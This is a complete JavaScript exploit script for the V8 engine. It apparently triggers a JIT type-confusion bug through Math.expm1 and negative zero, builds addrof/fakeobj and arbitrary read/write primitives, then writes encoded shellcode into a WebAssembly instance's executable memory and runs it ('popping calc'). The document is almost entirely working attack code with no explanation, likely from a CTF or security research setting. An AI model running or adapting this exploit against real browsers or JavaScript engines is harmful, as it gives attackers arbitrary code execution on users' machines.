let ab = new ArrayBuffer(8);
let fv = new Float64Array(ab);
let uv = new BigUint64Array(ab);

function ftoi(value) {
  fv[0] = value;
  return uv[0];
}

function itof(value) {
  uv[0] = BigInt(value);
  return fv[0];
}

function hexp(value) {
  print("0x" + value.toString(16).padStart(16, "0"));
}

const MAGIC = 0.1;
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;
var shellcode = [1220018433, 16843009, 16863304, 3090053474, 1617781249, 21508356, 608745519, 1970500143, 1651076688, 1216997224, 993067265, 2167677953, 16843080, 3091482963, 1347174745, 1028665810, 1382680666, 1208083026, 1216995946, 33426468, 838227562, 140396545, 3864414345, 3865721688, 252022928];

function foo(x) {
  let arr = [MAGIC, MAGIC, MAGIC];
  let arr2 = Array.of(10.1, 10.1, 10.1, 10.1, 10.1);
  let victim_ab = new ArrayBuffer(0x1234);
  let dv = new DataView(victim_ab);
  victim_obj = [0x1336, {a: 0x41414141}, 0x1337];
  let y = {a: -0};
  let b = Object.is(Math.expm1(x), y.a);


  arr[b * 6] = itof(0x400000000000);
  
  let ab_index = arr2.indexOf(itof(0x1234));

  if (arr2.length != 5) {
    print("[+] Successfully corrupt arr2");
  }

  if (ab_index != -1) {
    ab_index += 1;
    print("[+] Found victim_ab length");

    let obj_index = arr2.indexOf(itof(0x133600000000));
    if (arr2[obj_index + 2] == itof(0x133700000000)) {
      print("[+] Found object");
      obj_index += 1;
    }

    function addrof(obj) {
      victim_obj[1] = obj;
      return ftoi(arr2[obj_index]);
    }

    function fakeobj(addr) {
      arr2[obj_index] = itof(addr);
      return victim_obj[1];
    }

    function readme(addr) {
      arr2[ab_index] = itof(addr);
      return dv.getBigUint64(0, true);
    }

    function writeme(addr, value) {
      arr2[ab_index] = itof(addr);
      dv.setUint32(0, value);
    }

    function copy_shellcode(addr, shellcode) {
			for (var i = 0; i < shellcode.length; i++) {
				writeme(addr + BigInt(4 * i), shellcode[i]);
			}
		}

    let wasm_addr = addrof(wasmInstance);
    let rwx_addr = readme(wasm_addr + 0xe8n - 1n);

    copy_shellcode(rwx_addr,  shellcode);
    print("[+] Shellcode copied");

    print("[+] Popping calc");
		func();
  }
}


for (var i = 0; i < 0x10000; i++) {
  foo("0");
}

foo(-0);